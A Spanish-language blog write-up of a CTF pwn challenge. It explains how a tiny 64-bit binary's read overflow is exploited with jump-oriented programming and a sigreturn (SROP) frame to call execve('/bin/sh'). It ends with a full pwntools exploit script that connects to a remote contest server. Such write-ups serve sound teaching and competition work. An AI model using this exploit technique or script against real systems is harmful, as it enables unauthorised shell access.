---
layout: post
title: WRITEUP. Scandinavian journal of psychology
date: 2020-06-15 00:55
comments: true
categories: [Sin categoría]
---
<!-- wp:paragraph -->
<p>Vengo con el vuelo del CTF de <a href="https://convid.cl/">CONVID </a>que estuvo, pero es que de Lujo! Felicitaciones a los organizadores. El CTF tenía de todo, desafios de Stego, Crypto, Misc, Web, etc. Y sobre todo mi categoría favorita PWN!,&nbsp; soy muy aficionado al exploit dev y sabiendo que algunos desafíos serian hechos por el gran <a href="https://c4ebt.github.io/">c4e </a>venía con muchas expectativas de lo mismo, por lo que me puse de meta intentar todos los desafíos posibles de la categoría, y estoy muy orgullo del logro, ya que no fue fácil<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/mEr6R7Atzk0P_eBf-ige4n8nB6ZVKeIy5F_jcIw2cq9sSdpadHely-af-AKnOpfyBd5moNHHftNeSEENWH4O9W7UFB_lsKqdlz168vmslgb3-WDudTscACoqnMBk0Yqn0fTjCVgw" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Hasta el último minuto no tenía equipo, pero mi amigo n0m0 (MVP de nuestro equipo) Se le ocurrió juntar algunos amigos para ver qué podíamos hacer,&nbsp; la verdad la experiencia siempre es grata, es increíble lo que puedes aprender de todos y las ideas que se discuten, así que gracias de nuevo a mi team Jot_Kiddiez (yeah hackers de los 90!). Me voy muy contento con el tercer lugar, además de felicitar los ganadores <a href="https://cntr0llz.com/">Cntr0llz </a>quienes por paliza nuevamente se llevan otro CTF a sus bolsillos.<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/yMTXIku1dBvKegxSs9KsbgEfU2ZUv_zUkCUW8p66_YhbwLbH7it79rfOPwC2NDrkjfk6p5y2-EmzbEfzEZGzUMmDBmxwfFrJWt_Q568rp4KtU_rHQMoOQyEuA4oDxkO_uUe7tSRV" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Yendo a lo nuestro! El reto en cuestión es un reto llamado Scandinavian Joournal of Psychology (Que fumaron?). Es un binario sujeto la ejecución&nbsp; de JOP (jump oriented programming), <a href="/writeup-juujuu-pwnday01-soluciones/">sí de nuevo</a>, pero esta vez las cosas son un poco más difíciles, casi tanto como con el desafío “Labot”, que pueden leer el writeup en el blog de otro crack  <a href="https://f4d3.io/convid-pwn-labot/">f4d3</a>!.&nbsp;<br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Revisamos primero el binario para observar que es un ELF de 64 bit dinámicamente linkeado.&nbsp;<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/263hl286PktO4QH05IFePzUUrHFhWnXCJ2gzzAFQRJDYKhCOHplX3pUXlZu27SRsTJPPb5OQZ57yN8EFx3J65s0f-ZKxuTKeQLDIzVwL08f8BEnvnnfgiFuf1mTJXsh0Bk0I6Nmf" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y podemos usar checksec para ver que tiene protección en el stack solamente (NX), por lo tanto no tendremos que lidiar con aslr</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/h16wTJ5FL9WbzfpDlD6EHAKHbkX_EslW23dCwO2ySlIomi-8njNfWzcNO6gCK44P2C17vXJryGQ_819gqHGpaqMiNLHYbt_3rlgb5iLksJDr6o24yDcaIKn_5t1eBbLmxe5OqxXD" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cuando analizamos el binario con radare2,, podemos observar que es un binario muy pequeño, sin instrucciones “ret” por lo que deberemos ocupar los saltos a registros para controlar el flujo del stack, luego de darnos cuenta que existe un overflow en la función read<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/tyBnJhaxNmL0k7nk2-kr4cC35H46HRAXFgxPsCYl0SEdJo9oqnfwqymV3ydP5xr7D7Dv6XJAkOzijS7bI7s07jl3JsakmEY3tW9lNinfqc_JUKbq7624t7lERhO_DhOfmUjNgXfu" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Probamos usar cyclic para identificar el crash en gdb<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/mT31CFHSg3zAmz62yTSPSKXKmBvqTRh8faN2Wcf__Gwzv8gs8zRZwfTTPpBm8ybx51orO1gTNJJE0jbz8Yg3vXHeQItQX--wEG0q82iJ4HpBCYjIGc6ttC4duw1kkyRgmm6poJYu" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y luego calcular el offset al crash en RSP que resulta en 264<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/n_6W1YXvLKTKre-EJK9DPYvTDAMEdGze9-3gx76EF_qBihALhRjKxsBZ7btvpYN0SQM2_CvnEA8NeXyR0sUCwEI9gcbhdOhUUGUPkdO-4Q6vhE2y5CMq6TWrdHoKyx2r93JbEkKf" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:image {"width":422,"height":144} -->
<figure class="wp-block-image is-resized"><img src="https://lh4.googleusercontent.com/NAQ6MQj7xZYoToYBy3lwJiN8uAKJ4sHlOFGTaNwGUHCmCnUZqVQ3fabDwIQnMbajcO2ecul8xkCDhELa_mUw5zkBnSRAXZkjjY9k8crOkftffBrz2dY0CbT96JJVslZ3N6PIAjcN" alt="" width="422" height="144" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Además podemos usar objdump para obtener más información del binario y buscar los gadgets disponibles, resulta interesante que existe una sección .data la cual nos será de utilidad más tarde<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":660,"height":189} -->
<figure class="wp-block-image is-resized"><img src="https://lh5.googleusercontent.com/8S8pi_CvQMYgQZbae4Hp7pEh5OB4ZLZYjBAWq4tBOeQdamPQPXDprzYDwrDjZuV8XaHRQB0g5-lHbmX4dLkPC8uHGmhtXaxF9qJYmc6wxuHplhoNy5VvtWjsl30u1vDSTLLcE4ya" alt="" width="660" height="189" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y aca los gadgets disponibles (muy pocos!)<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/LITYQjXoxQbixxNrpqONE6rpmAe47i4GHNGtpzqs4MTpO9kqx4ANZxaczxguATeZMTwzfE0EqIt5ZLuK0qBGtat7-P_b18hpxTBSr9NYICxZ2Jo-F6o3vdC8Dakwnlr-O9Dx5GA3" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Qué hacemos ahora pues jop! Como expliqué en otras ocasiones necesitamos setear&nbsp; un dispatcher el cual nos permita retornar al stack y tomar instrucciones de el cada vez que “retornemos” con un salto. El registro a setear parece ser RCX por y nuestro dispatcher es el salto al stack:<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":657,"height":47} -->
<figure class="wp-block-image is-resized"><img src="https://lh3.googleusercontent.com/VItpgQdij6u3CmiCqOehlBK6zZol9TJdpE9iQUEOyANUPZVu5f4HY7x1pqdv-ATjGbtzOb8-2oCZHU9WjkYNbc6QkR5jujLnDGIiQG9ZBamRZYD4p2RReXUSJaPRbnZaiEPreLOA" alt="" width="657" height="47" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Así que comenzamos seteando algunas variables y nuestro payload:<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":480,"height":402} -->
<figure class="wp-block-image is-resized"><img src="https://lh4.googleusercontent.com/LeH4phcdgPkcQQ_2v-XwK8iRI-3tNgm7kle1SeEGHV3FS7aEVEwaBr_EjXT0GtpYuuDVfDa3NbJh99yC1Y6a1YtpqkO1swkY7kMlf8WVnSghA0EXKLNUWuOmrIgmFW70rwR6HKLF" alt="" width="480" height="402" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Bueno con esto ya podemos saber que siempre que ocupemos un gadget que lleve a un salto a RCX vamos a poder retornar a ejecutar la instrucción que se encuentr en el stack, y ahora… Aca es donde uno se cabecea y le da vueltas, no estaba fácil. Luego de muchas pruebas observamos que si llamamos nuevamente a read, el valor de RAX se intercambia con el valor de RDX (el cual contiene el tamaño del buffer donde lee read.<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/iwyUKBLWujtRy5w-dGjLHXs1r95UEriABK17C9wUjMCdC5OV3HHMMqOAtXvGbVb3vpGBXeVBCm2ysE2QQkKY9lWpiHPeUWjIQmZRp8lo7-D-7Zo6mh9B7PCcBCE2jYPpBF02nRg7" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh5.googleusercontent.com/cjXmcexfZaoXMQExmQnLNaErTwIy95MWR8ZUFgd0iH4PEWPM2rnt4u0WVfVWLah887IPn5Vk4ruo9DqImoCwd-5qULkLaGexpxjZy6kSXEKuuvyobsLEvsLxsHFVzVFY6b9HmHFH" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Genial si sumamos esto al gadget que nos permite aumentar RAX en 7 podemos hacer que el valor de RAX sea 0xF. Que nos permite esto? Pues hacer SROP! O sigreturn oriented programming, que en verdad es una técnica de explotación del tipo “one gadget” ya que nos permite hacer una llamada a sigreturn (que no pide argumentos) y esto nos ayudará a luego crear un “fake frame” lo cual nos permitirá situar los registros a los valores que queramos.<br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://lwn.net/Articles/676803/">Mas info de SROP Aca!</a><br></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Excelente pues llamaremos entonces a sigreturn y seteamos los registros para llamar a execve</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Y dado que llamamos de nuevo read usaremos read para setear los valores de RSI a .data (y escribir /bin/sh para luego usarlo con execve()). Y RDX a 8 para setear luego RAX al mismo valor, nuestro payload queda así (<a href="https://docs.pwntools.com/en/stable/rop/srop.html">gracias pwntools!</a>)<br></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/0uG6QbXl1yGKIUbQnN3CH0J4NUfk0WSRCud8RZw6iwOY7tRs2eg2FBUYf_A_WIiIUnvRDuJF9utMnudAWydObKGl6DdcmSb764aXSjMTBaVh42dFyyvC-cgwtcF5WkNc7SyUAQO3" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ahora le ponemos bencina a la cosa y ejecutamos, podemos ver la llamada a read para escribir en .data:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":583,"height":130} -->
<figure class="wp-block-image is-resized"><img src="https://lh3.googleusercontent.com/UWLV5sSJr7pNMYjY4trWaoCurFox6xsrv-MTJf8ajs2wqY-Lh1mNMOgI9di9-z592GTH-WA9rHesWVMt9xqtLovi8Jpj2az2mOhbE8Ctst5yEhqCRSSS6Pt_AkSkiKCMHQGvZ4E3" alt="" width="583" height="130" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>y luego sigreturn para setear los registros<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":568,"height":164} -->
<figure class="wp-block-image is-resized"><img src="https://lh6.googleusercontent.com/mdTIBma4otEJsJnXXRuOYAzdqrqVlU70tI9OVjNv36mXgFSgMqZerDA4mAo3qu-jwSDSRrq83NZ8RtPrfdSZzq1Wn-4z4kG9WASKLpRswBJPUDcQ99hUdQ8Yo3UilukwCS2zQpzC" alt="" width="568" height="164" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Y finalmente exceve() con la llamada a /bin/sh<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":580,"height":121} -->
<figure class="wp-block-image is-resized"><img src="https://lh5.googleusercontent.com/UaAOu2VSnD_FYFnHgYrYHzCXNmtZ3b9nlf3V_4RgaPDqZzeYWJ20hgaOP9QeEHngcT0CtJ9eqfJXJ6M7xoUsNBRetQSrmlI6Y-L185RU7KdUbW3j2SlSNdpS0RH-GGkFRDhpbXKx" alt="" width="580" height="121" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ahora aprobamos remoto y BANG! FLAG DANCE! </p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/KFc40PWR-jb9LykpS7NI6KZrUy3eernjVA0gyGm_368DxHVjDptj9DzsBZfzyb9-gMISC5aByM3nkGZwIvoBlPgTy3oqclLKiymKbQ-8NOOuUk7An9gIhM5EOVieZh_6lbqvwW4u" alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Aca les dejo el exploit completo, lo pase genial! Pronto espero compartir mas writeups del CTF, estuvo muy bueno!</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>from pwn import *
from time import sleep

context.clear(arch="amd64")
gdbscript = '''
break *0x00400107
continue
'''
data = 0x600124
dispatcher = 0x00400107
binsh = "/bin/sh\x00"
syscall = 0x400105

payload = (cyclic(256))
payload += p64(0x400115) #pop rcx
payload += p64(dispatcher)#rcx
payload += p64(0x400114)#pop
payload += p64(data)#rsi
payload += p64(0x8)#rdx
payload += p64(0x4000ff)#read
payload += p64(0x400119)
payload += p64(syscall)

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b
frame.rdi = data
frame.rsi = 0 
frame.rdx = 0
frame.rip = syscall
payload += str(frame)

#r = gdb.debug('./nanana', gdbscript)
#r = process('./nanana')
r = remote('172.104.234.7', 7891)
r.sendline(payload)
sleep(1)
r.sendline(binsh)# instrucciones?

r.interactive()
</code></pre>
<!-- /wp:code -->
